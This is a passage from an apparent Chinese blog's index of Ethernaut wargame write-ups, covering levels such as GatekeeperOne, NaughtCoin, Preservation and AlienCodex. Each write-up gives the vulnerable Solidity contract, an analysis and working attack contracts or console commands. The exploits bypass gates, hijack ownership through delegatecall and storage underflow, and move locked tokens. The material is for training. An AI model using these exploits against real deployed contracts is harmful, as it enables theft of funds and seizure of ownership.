enter 函数 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract GatekeeperOne { using SafeMath for uint256; address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _;//要求tx.origin不等于请求者，通过其他合约调用实现绕过 } modifier gateTwo() { require(gasleft().mod(8191) == 0); _;//gas要满足8191取余为0 } modifier gateThree(bytes8 _gateKey) { require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\"); require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\"); require(uint32(uint64(_gateKey)) == uint16(tx.origin), \"GatekeeperOne: invalid gateThree part three\"); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } 合约分析：从上面了解到要想enter需要满足gateOne、gateTwo、gateThree三个修饰器的检查条件，即需要满足以下条件，先说第一步和第三步：1、gateOne ：通过其他合约来进行调用即可使得msg.sender和tx.origin不等绕过，假设用户通过合约A调用合约B： 对于合约A：tx.origin和msg.sender都是用户 对于合约B：tx.origin是用户，msg.sender是合约A的地址 3、gateThree() ： modifier gateThree(bytes8 _gateKey) { require(uint32(_gateKey) == uint16(_gateKey)); require(uint32(_gateKey) != uint64(_gateKey)); require(uint32(_gateKey) == uint16(tx.origin)); _; } 先看最后一个判断 tx.origin 是最初的调用者，就是我们的账户，uint16 是最后 8 字节，要与 uint32 的 key 也就是最后 16 字节相等，所以 key 的最后 8 字节就是 tx.origin 的最后 8 字节 同时如果第一个条件 uint32 的 key 要与 uint16 的 key 相等，所以 key 的 uint32 类型 16 字节前面的八个字节要全为 0 再看中间那个，key 的后 16 字节还不能和整个 32 字节相等，前面只要不是 0 就不会相等 uint16(address) 的转换会保留 address 最后两个字节，由上述 1，3 可得，uint32(uint64(_gateKey)) 等于 uint32(tx.origin) &amp; 0x0000FFFF。再结合上述 2，只要 _gateKey 的最后 4 个字节为 uint32(tx.origin) &amp; 0x0000FFFF，其前面的 4 个字节可以为全 0 外的任意值。我们这里直接取 player 地址的最后八个字节，然后将 tx.origin 倒数三四字节换成 0000 得到 _gateKey。 综上，key 如果是bytes8(tx.origin) &amp; 0xFFFFFFFF0000FFFF的话就正好可以 2、gateTwo ：这里的msg.gas 指的是运行到当前指令还剩余的 gas 量，要能整除 8191。那我们只需要 8191+x ，x 为从开始到运行完 msg.gas 所消耗的 gas。通过查阅资料发现msg.gas在文档里的描述是remaining gas，在Javascript VM环境下进行Debug可在Step detail 栏中可以看到这个变量，我们尝试在VM中进行调试一下： pragma solidity ^0.4.18; contract GatekeeperOne { address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _;//可以部署一个中间合约来调用绕过 } modifier gateTwo() { require(msg.gas % 8191 == 0); _;//gas要满足8191取余为0 } modifier gateThree(bytes8 _gateKey) { require(uint32(_gateKey) == uint16(_gateKey)); require(uint32(_gateKey) != uint64(_gateKey)); require(uint32(_gateKey) == uint16(tx.origin)); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } contract MyAgent { GatekeeperOne c; function MyAgent(address _c) public { c = GatekeeperOne(_c); } function exploit() public { bytes8 _gateKey = bytes8(msg.sender) &amp; 0xffffffff0000ffff; c.enter.gas(81910)(_gateKey); } } 使用这个代码在remix中运行，编译成功 先获取到合约地址 将合约地址复制给MyAgent中去进行Deploy 直接exploit，报错，然后点击debug，注意，这里我们是为了得到执行到第二步的gas查看的 通过将游标移动到大致这个位置，目的是找到GAS和DUP2这两个地方，GAS关键字是获取执行可用的gas。由于EVM是栈虚拟机，因此此处需要注意获取到的gas后的dup2，dup2是将栈内的第2个元素（从栈顶向下算）移至栈顶。查看他们Step details中的gas和remaining gas，其中gas表示这一小步到下一小步需要的gas使用量，remaining gas表示gas的剩余量，而我们所需要的msg.gas就是remaining gas。 也就是说我们从最开始给到的gas，81910，执行到我们的第二步使用了81910-81695=215的gas，这里妙就妙在81910本身就是8191的倍数，只要我们如果我们想要让这一步结束之后 remaining gas % 8191 = 0 的话，或者说想要让他执行完之后刚好是 81910 的话，就需要让之前的值为：213+2+81910。所以想要绕过第二个关卡的话，值应该是 213+2+81910。这时候我们只需要把代码中给到的gas修改成81910+215=82125就可以，让我们来验证一下 entrant 已经从 0x0000000000000000000000000000000000000000 变为你的 player 地址，测试成功，开启实战吧 攻击流程：1、获取新实例，查看玩家地址，合约地址，查看entrant当前数值 2、直接使用相同的合约，复制合约地址给攻击合约进行编译，但是这里存在一个问题，我们并不知道通过remix上链和到达我们所需要的GAS的时候到底需要多少gas，这里需要测试几下。直接编译上链exploit点击exploit会失败，我们去钱包里面找到失败的交易 去etherscan上查看，点击右上角小标中的GETH调试追溯 、 找到GAS，并且分析整个上链执行的过程并记录 几组数据观察可以发现，21064和5042可能是上链或者链上数据使用的gas，而从step[101]到GAS中间始终是252，step[101]正好是我们合约中所输入的gas，（第二组数据可能是因为我修改了gaslimit太小产生的溢出出错，这些都不重要），我们只要让[101]中的数等于81910+2+252=82164即可（注意这里需要加2，因为gas走到下一步需要2的gas）于是修改gas数值 部署合约，地址，编译，攻击，成功！！！ 3、检查结果，快乐提交！","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Gatekeeper Two第14关练习","slug":"Ethernaut/14.Ethernaut-Gatekeeper Two","date":"2021-07-20T05:19:00.000Z","updated":"2021-08-02T08:27:30.399Z","comments":true,"path":"/Ethernaut/Ethernaut/14.Ethernaut-Gatekeeper Two/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/14.Ethernaut-Gatekeeper%20Two/","excerpt":"","text":"Gatekeeper Two第14关练习要求：通过看门人的三道检查，成为进入者(entrant)。 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract GatekeeperTwo { address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _; } modifier gateTwo() { uint x; assembly { x := extcodesize(caller()) } require(x == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } 合约分析：gateOne()：我们可以用第三方合约来调用 enter() 实现绕过 gateTwo()：gateTwo中extcodesize 用来获取指定地址的合约代码大小。这里使用的是内联汇编来获取调用方(caller)的代码大小，一般来说，当caller为合约时，获取的大小为合约字节码大小,caller为账户时，获取的大小为 0 。条件为调用方代码大小为0 ，也就是说，在执行初始化代码（构造函数），而新的区块还未添加到链上的时候，新的地址已经生成，然而代码区为空。此时，调用 EXTCODESIZE() 返回为 0。因此，我们需要把攻击合约的调用操作写在 constructor 构造函数中。 gateThree()：传入一个八字节的 key，把 msg.sender 的 hash 计算出来与 uint64 类型的 key 异或，要等与 0-1，也就是 0xFFFFFFFFFFFFFFFF，只要我们先用 uint64(keccak256(msg.sender)) 与 0xFFFFFFFFFFFFFFFF 进行异或，这样再次异或的时候就成了 0xFFFFFFFFFFFFFFFF，也就符合条件了（优先级为 – 大于 ^ 大于 ==）最后攻击合约如下： pragma solidity ^0.4.25; contract GatekeeperTwo { address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _; } modifier gateTwo() { uint x; assembly { x := extcodesize(caller) } //用内联汇编来获取调用方caller的代码大小 require(x == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } contract HackGateTwo { constructor(address _addr) public { bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)); (bool success, ) = _addr.call(abi.encodeWithSignature(\"enter(bytes8)\", _gateKey)); require(success); } } 要注意使用constructor函数，以下两个同理： contract HackGateTwo { constructor(address _addr) public { bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)); (bool success, ) = _addr.call(abi.encodeWithSignature(\"enter(bytes8)\", _gateKey)); require(success); } } contract Attack { GatekeeperTwo target = GatekeeperTwo(instance_address); constructor(address instance_address) public { target.enter((bytes8)(uint64(keccak256(address(this))) ^ (uint64(0) - 1))); } } 攻击流程：1、获取新实例，查看合约信息，合约地址，合约entrant() 2、部署合约，将合约地址复制到攻击合约中编译执行 3、查看 entrant 发现已经发生变化，说明攻击成功，提交即可过关。","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Naught Coin第15关练习","slug":"Ethernaut/15.Ethernaut-Naught Coin","date":"2021-07-20T02:51:00.000Z","updated":"2021-08-02T08:27:30.398Z","comments":true,"path":"/Ethernaut/Ethernaut/15.Ethernaut-Naught Coin/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/15.Ethernaut-Naught%20Coin/","excerpt":"","text":"Naught Coin第15关练习要求：NaughtCoin 是一个标准的 ERC20 token 合约，并且你已经拥有了所有的 token。但是问题是，需要10年后才能够执行 transfer 将 token 转移。现在你的目标是突破限制，将所有 token 转移到别的地址，使用合约中你的 token 余额变为 0。 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/token/ERC20/ERC20.sol'; contract NaughtCoin is ERC20 { // string public constant name = 'NaughtCoin'; // string public constant symbol = '0x0'; // uint public constant decimals = 18; uint public timeLock = now + 10 * 365 days; uint256 public INITIAL_SUPPLY; address public player; constructor(address _player) ERC20('NaughtCoin', '0x0') public { player = _player; INITIAL_SUPPLY = 1000000 * (10**uint256(decimals())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint(player, INITIAL_SUPPLY); emit Transfer(address(0), player, INITIAL_SUPPLY); } function transfer(address _to, uint256 _value) override public lockTokens returns(bool) { super.transfer(_to, _value); } // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() { if (msg.sender == player) { require(now &gt; timeLock); _; } else { _; } } } 合约分析：根据题意，需要将自己的 balance 清空。合约里提供了 transfer() 函数来进行转账操作，但注意到有一个 modifier lockTokens()，限制了只有十年后才能调用 transfer() 函数。需要解题者 bypass it，注意到该合约是 StandardToken 的子合约，以上代码我们可以看出合约NaughtCoin继承了StandardToken但是没有对父合约做重写，导致利用父合约的函数可以进行及时转账。而子合约NaughtCoin也没有什么问题，那我们还是回过头来看看import的父合约 StandardToken.sol。题目中也给出了源码库地址与 ERC20 接口规范文档https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contractshttps://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md 在子合约中找不出更多信息的时候，把目光更多放到父合约和接口上，在接口规范里能看到，除了 transfer() 之外，还有 transferFrom() 函数也可以进行转账操作。重写transferFrom就是一个可利用的点。直接看看StandardToken.sol代码： contract StandardToken { using ERC20Lib for ERC20Lib.TokenStorage; ERC20Lib.TokenStorage token; ... function transfer(address to, uint value) returns (bool ok) { return token.transfer(to, value); } function transferFrom(address from, address to, uint value) returns (bool ok) { return token.transferFrom(from, to, value); } ... } 跟进ERC20Lib.sol： library ERC20Lib { ... function transfer(TokenStorage storage self, address _to, uint _value) returns (bool success) { self.balances[msg.sender] = self.balances[msg.sender].minus(_value); self.balances[_to] = self.balances[_to].plus(_value); Transfer(msg.sender, _to, _value); return true; } function transferFrom(TokenStorage storage self, address _from, address _to, uint _value) returns (bool success) { var _allowance = self.allowed[_from](msg.sender); self.balances[_to] = self.balances[_to].plus(_value); self.balances[_from] = self.balances[_from].minus(_value); self.allowed[_from](msg.sender) = _allowance.minus(_value); Transfer(_from, _to, _value); return true; } ... function approve(TokenStorage storage self, address _spender, uint _value) returns (bool success) { self.allowed[msg.sender](_spender) = _value; Approval(msg.sender, _spender, _value); return true; } } 需要注意的是，与 transfer() 不同，调用 transferFrom() 需要 msg.sender 获得授权。由于我们本就是合约的 owner，可以自己给自己授权。授权操作在接口文档里也有 function approve(address _spender, uint256 _value) returns (bool success) 此处可以直接调用这个transferFrom了。但是transferFrom有一步权限验证，要验证这个msg.sender是否被_from（实际上在这里的情景的就是自己是否给自己授权了），那么我们同时还可以调用approve 给自己授权。 部署完成后复制合约地址，直接在题目界面 console 操作，需要注意toWei语句表达方式，默认单位是ether web3.js toWei await contract.approve(player,web3.utils.toWei('1000000')) // 给自己授权 await contract.transferFrom(player,contract.address,web3.utils.toWei('1000000')) // 向刚部署的第三方合约转钱，清空 player 的 balance 攻击流程：1、获取实例，查看一下当前账户余额，可以看到是25位，那么我们允许的是就是1000000ether， 2、使用approve进行授权 3、通过transferFrom来实施转账，注意默认单位是ether，别出错 4、查看余额，钱包中的代币消失了，快乐提交","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Preservation第16关练习","slug":"Ethernaut/16.Ethernaut-Preservation","date":"2021-07-18T11:28:00.000Z","updated":"2021-08-02T08:27:30.400Z","comments":true,"path":"/Ethernaut/Ethernaut/16.Ethernaut-Preservation/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/16.Ethernaut-Preservation/","excerpt":"","text":"Preservation第16关练习要求：此合同使用库存储两个不同时区的两个不同时间，构造函数为每次要存储的库创建两个实例。 而玩家的目标是获取合约的owner权限。 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Preservation { //公共图书馆合约 address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; //设置delegatecall的函数签名 bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\")); constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public { timeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender; } //设置时区1的时间 function setFirstTime(uint _timeStamp) public { timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); } //设置时区2的时间 function setSecondTime(uint _timeStamp) public { timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); } } //简单的图书馆合同来设定时间 contract LibraryContract { //存储时间戳 uint storedTime; function setTime(uint _time) public { storedTime = _time; } } 合约分析：先回忆一下 call() 当使用方法是：require(msg.sender.call.value(_weiToWithdraw)()); 则作用是将_weiToWithdraw个以太币发送给msg.sender地址，并且调用msg.sender地址的fallback函数 当使用方法是： bytes4 methodId = bytes4(keccak256(\"increaseAge(string,uint)\"));//函数hash addr.call(methodId,\"jack\",1); 那就是调用了函数increaseAge，并且传入参数是\"jack\",1 call()的返回结果是一个bool，表示是否成功的调用，或者是失败引起了EVM异常。该方法无法直接访问函数返回结果(因为需要事前知道编码和返回结果大小)。 call()的返回结果即使成功，并不能说操作成功了，只是没有出现异常，比如我们第一个例子中，实际是调用到了fallback()函数。 delegatecall()call与delegatecall的功能类似，区别仅在于后者仅使用给定地址的代码，其它信息则使用当前合约(如存储，余额等等)。 函数的设计目的是为了使用存储在另一个合约的库代码。 二者执行代码的上下文环境的不同，当使用call调用其它合约的函数时，代码是在被调用的合约的环境里执行，对应的，使用delegatecall进行函数调用时代码则是在调用函数的合约的环境里执行 三种调用方式的异同点 call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境(合约的 storage)。 delegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。 callcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境。 考虑以下因素： Preservation 调用 setTime 的时候，修改的是 Preservation 的存储空间，而非 LibraryContract 的。 setTime 执行的时候，会对 uint 类型的 storedTime 赋值，这实际意味着对存储空间中的 slot 0 进行赋值。 Preservation 存储空间中 slot 0 存储的是 timeZone1Library，也就是调用 setTime 将会导致 timeZone1Library 被修改。 综合以上 3 点，我们可以将 timeZone1Library 替换为攻击合约。攻击合约沿用上面的思路，构建一个新的 LibraryContract，该合约在调用 setTime 的时候，会修改存储空间中 slot 2 的值（Preservation 的 slot 2 存储的是 owner）。攻击合约如下： pragma solidity ^0.4.25; contract PreservationPoc { address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; function setTime(uint _time) public { owner = address(_time); } } 攻击流程：1、获取实例 2、在remix中部署恶意合约3、在控制台执行一下命令：（恶意合约地址就在部署那里) await contract.setSecondTime('恶意合约地址') await contract.setFirstTime('player地址') 4、这时候合约的拥有者就成了我们自己 5、快乐提交","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Recovery第17关练习","slug":"Ethernaut/17.Ethernaut-Recovery","date":"2021-07-18T08:42:00.000Z","updated":"2021-08-02T08:27:30.400Z","comments":true,"path":"/Ethernaut/Ethernaut/17.Ethernaut-Recovery/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/17.Ethernaut-Recovery/","excerpt":"","text":"Recovery第17关练习要求：合约的创建者已经构建了一个非常简单的合约示例。任何人都可以轻松地创建新的代币。部署第一个令牌合约后，创建者发送了0.5ether以获取更多token。后来他们失去了合同地址。 如果您可以从丢失的合同地址中恢复（或移除）0.5ether，则此级别将完成。 找出目标合约生成的代币合约，并取出里面的 ETH 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Recovery { //generate tokens function generateToken(string memory _name, uint256 _initialSupply) public { new SimpleToken(_name, msg.sender, _initialSupply); } } contract SimpleToken { using SafeMath for uint256; // public variables string public name; mapping (address =&gt; uint) public balances; // constructor constructor(string memory _name, address _creator, uint256 _initialSupply) public { name = _name; balances[_creator] = _initialSupply; } // collect ether in return for tokens fallback() external payable { balances[msg.sender] = msg.value.mul(10); } // allow transfers of tokens function transfer(address _to, uint _amount) public { require(balances[msg.sender] &gt;= _amount); balances[msg.sender] = balances[msg.sender].sub(_amount); balances[_to] = _amount; } // clean up after ourselves function destroy(address payable _to) public { selfdestruct(_to); } } 合约分析：由于在链上所有东西都是透明的，因此合约创建时我们直接查看合约就可以查看到新建立的合约的地址。直接去 Etherscan 找 instance 的交易记录，可以很容易找到代币合约，然后调用其 destroy 函数即可。之后如果要回复token可以借助destory函数来实现，可以构建如下EXP: pragma solidity ^0.4.23; contract SimpleToken { // public variables string public name; mapping (address =&gt; uint) public balances; // collect ether in return for tokens function() public payable ; // allow transfers of tokens function transfer(address _to, uint _amount) public ; // clean up after ourselves function destroy(address _to) public ; } contract RecoveryPoc { SimpleToken target; constructor(address _addr) public{ target = SimpleToken(_addr); } function attack() public{ target.destroy(tx.origin); } } 攻击流程：1、获取新实例，查看合约地址 2、在meta mask中从etherscan中查看刚刚获取实例时的合约交互，查看Internal Txns 3、可以观察发现我们的帐户给了他 1 ether，然后他又给了另一个地址 0.5 ether，这就是新创建的合约的地址，我们只需要调用新建的这个合约的 destory。 4、在remix中部署RecoveryPoc，将新地址复制出来 5、点击attack，查看交易详情 6、有看到TRANSFER和SELF DESTRUCT，新合约把0.5的eth退还给我们，同时开启了自毁程序 7、冲冲冲，快乐提交","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"MagicNumber第18关练习","slug":"Ethernaut/18.Ethernaut-MagicNumber","date":"2021-07-18T06:12:00.000Z","updated":"2021-08-02T08:27:30.401Z","comments":true,"path":"/Ethernaut/Ethernaut/18.Ethernaut-MagicNumber/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/18.Ethernaut-MagicNumber/","excerpt":"","text":"MagicNumber第18关练习要求：为了解决这个问题，你只需要为以太坊提供一个“Solver”，一个用正确数字响应“whatIsTheMeaningOfLife()”的合约。 容易吧？嗯……有一个问题。 求解器的代码需要非常小。真的好小。就像 freakin’ 真的非常非常小：最多 10 个操作码。 提示：也许是时候暂时离开 Solidity 编译器的舒适区，并手动构建这个 O_o。没错：原始 EVM 字节码。 部署一个只有 10 个 opcode 的合约，该合约在调用后返回 42 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract MagicNum { address public solver; constructor() public {} function setSolver(address _solver) public { solver = _solver; } /* ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____ __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___ ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__ ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___ ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____ __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________ _\\///////////\\\\\\//____/\\\\\\/___________ ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ ___________\\///_____\\///////////////__ */ } 合约分析：先看这个 参考Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodes | by Nicole Zhu | Coinmonks | Medium 参考 https://f3real.github.io/Ethernaut_wargame19.html 图片来自于https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2 先看一下 contract creation 期间会发生什么：1、首先，用户或合约将交易发送到以太网网络。此交易包含数据，但没有 to 地址，表明这是一个合约创建，而不是一个 send/call transaction2、其次，EVM 将 Solidity（高级语言）的合约代码编译为 bytecode（底层的机器语言），该 bytecode 直接转换为 opcodes ，在单个调用堆栈中运行 需要注意的是：contract creation 的 bytecode 包含两部分：initialization code 和 runtime code 3、在 contract creation 期间，EVM 仅执行 initialization code 直到到达堆栈中的第一条 STOP 或 RETURN 指令，在此阶段，合约的 constructor() 会被运行，合约便有地址了 在运行 initialization code 后，只有 runtime code 在堆栈上，然后将这些 opcode 拷贝 到 memory 并返回到 EVM 4、最后，EVM 将 runtime code 返回的 opcode 存储在 state storage ，并与新的合约地址相关联，在将来对新合约的调用时，这些 runtime code 将被执行 所以为了解决该题，我们需要initialization opcodes和runtime codes initialization opcodes: 由 EVM 运行创建合约并存储将来要用的 runtime codes runtime codes: 包含所需的实际执行逻辑。对于本题来说，这是应该返回的代码的主要部分，应该 return 42 并且 under 10 opcodes 1、先来看 runtime codes : 返回值由 return(p, s) 操作码处理，但是在返回值之前，必须先存储在内存中，使用 mstore(p, v) 将 42 存储在内存中 首先，使用 mstore(p, v) 将 42 存储在内存中，其中 p 是在内存中的存储位置， v 是十六进制值，42 的十六进制是 0x2a 0x602a ;PUSH1 0x2a v 0x6080 ;PUSH1 0x80 p 0x52 ;MSTORE 然后，使用 return(p, s) 返回 0x2a ，其中 p 是值 0x2a 存储的位置，s 是值 0x2a 存储所占的大小 0x20 ，占32字节 0x6020 ;PUSH1 0x20 s 0x6080 ;PUSH1 0x80 p 0xf3 ;RETURN 所以 runtime codes 应该是 602a60805260206080f3 ，正好 10 opcodes 2、再来看 initialization codes : 首先，initialization codes 需要先将 runtime codes 拷贝到内存，然后再将其返回到 EVM 。将代码从一个地方复制到另一个地方是 codecopy(t, f, s) 操作码。t 是代码的目标位置，f 是 runtime codes 的当前位置，s 是代码的大小，以字节为单位，对于 602a60805260206080f3 就是 10 bytes ;copy bytecode to memory 0x600a ;PUSH1 0x0a S(runtime code size) 0x60?? ;PUSH1 0x?? F(current position of runtime opcodes) 0x6000 ;PUSH1 0x00 T(destination memory index 0) 0x39 ;CODECOPY 然后，需要将内存中的 runtime codes 返回到 EVM ;return code from memory to EVM 0x600a ;PUSH1 0x0a S 0x6000 ;PUSH1 0x00 P 0xf3 ;RETURN initialization codes 总共占了 0x0c 字节，这表示 runtime codes 从索引 0x0c 开始，所以 ?? 的地方是 0x0c 所以，initialization codes 最后的顺序是 600a600c600039600a6000f3 所以，opcodes最后的顺序是 0x600a600c600039600a6000f3602a60805260206080f3 对于操作码的执行我们需要用转账函数： web3.eth.sendTransaction({from:player,data:bytecode},function(err,res){console.log(res)}) 然后点击查看新合约地址，得到 Contract address，再调用合约中的setSolver(“新合约地址”);就可以了 最终攻击代码如下： var bytecode = \"0x600a600c600039600a6000f3602A60805260206080f3\"; web3.eth.sendTransaction({from:player, data:bytecode}, function(err,res){console.log(res)}); // 通关 Etherscan 得到合约地址 contractAddress await contract.setSolver(\"新的合约地址\"); 攻击流程：1、获取新实例，将代码输入 2、执行操作码转账函数 3、在etherscan上找到新合约地址 4、调用函数，冲！提交","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Alien Codex第19关练习","slug":"Ethernaut/19.Ethernaut-Alien Codex","date":"2021-07-18T01:15:00.000Z","updated":"2021-08-02T08:27:30.401Z","comments":true,"path":"/Ethernaut/Ethernaut/19.Ethernaut-Alien Codex/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/19.Ethernaut-Alien%20Codex/","excerpt":"","text":"Alien Codex第19关练习要求：获取合约的所有权 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.5.0; import '../helpers/Ownable-05.sol'; contract AlienCodex is Ownable { bool public contact;//布尔型变量contact bytes32[] public codex; modifier contacted() { assert(contact); _;//函数修饰符,要通过contact必须要是true } function make_contact() public { contact = true;//可以通过这个函数,使得contact变为true } function record(bytes32 _content) contacted public { codex.push(_content); }//增加数组长度 function retract() contacted public { codex.length--; }//减少数组长度 function revise(uint i, bytes32 _content) contacted public { codex[i] = _content; }//修改数组里的内容 } 合约分析：该合约的 owner 字段定义在 Ownable 中，存储在 slot 0，我们的目标就是替换 slot 0 中的数据。注意以下几点： 目标合约定义了一个叫 codex 的 bytes32[] 类型的数组，我们可以向该数组中添加/修改数据，还可以修改数组的长度 在 Solidity 中，插槽数组大小为 2**256，codex 中的元素为 bytes32 类型，所以一个元素会占据一个 slot 在 Solidity 中，(2**256 - 1) + 1 = 0 各个字段在 Storage 中的布局： address _owner: slot 0, 20 bytes bool contact: slot 0, 8 bytes length of codex: slot 1, 32 bytes codex elements: start from slot keccak256(1) 综合这些信息不难想到，我们可以通过让 codex 溢出来访问到 slot 0。Storage 的情况可以使用 remix 的 Debug 功能来观察、验证。 具体的攻击步骤如下： contract.make_contact() contract.retract() // 该步骤使得 codex.length 溢出，codex.length == 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff // codex 的第一个元素应该位于 keccak256(abi.encodePacked(1)) == 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6，该 slot 到 slot 0 的距离为: // 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 1 // 结果为 35707666377435648211887908874984608119992236509074197713628505308453184860938 contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938','0x000000000000000000000000·34DC7d4F5E3512B66271Ce64198c20DFD8B53897这里替换玩家的地址·') // 注意 player 需要添加前置 0，因为 address 是 20 bytes，而 slot 0 存储 32 bytes 攻击流程：1、获取新实例 2、调用make_contact函数 3、调用retract函数 4、使用revise函数让owner变成玩家自己，检查结果 5、快乐提交","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Denial第20关练习","slug":"Ethernaut/20.Ethernaut-Denial","date":"2021-07-16T20:56:00.000Z","updated":"2021-08-02T11:09:37.250Z","comments":true,"path":"/Ethernaut/Ethernaut/20.Ethernaut-Denial/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/20.Ethernaut-Denial/","excerpt":"","text":"Denial第20关练习要求：目标：造成 DOS 使得合约的 owner 在调用 withdraw 时无法正常提取资产 要求就是在调用 withdraw 时，禁止 owner 转走账户的 1% 的余额 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Denial { using SafeMath for uint256; address public partner; // withdrawal partner - pay the gas, split the withdraw address payable public constant owner = address(0xA9E); uint timeLastWithdrawn; mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances function setWithdrawPartner(address _partner) public { partner = _partner; } // withdraw 1% to recipient and 1% to owner function withdraw() public { uint amountToSend = address(this).balance.div(100); // perform a call without checking return // The recipient can revert, the owner will still get their share 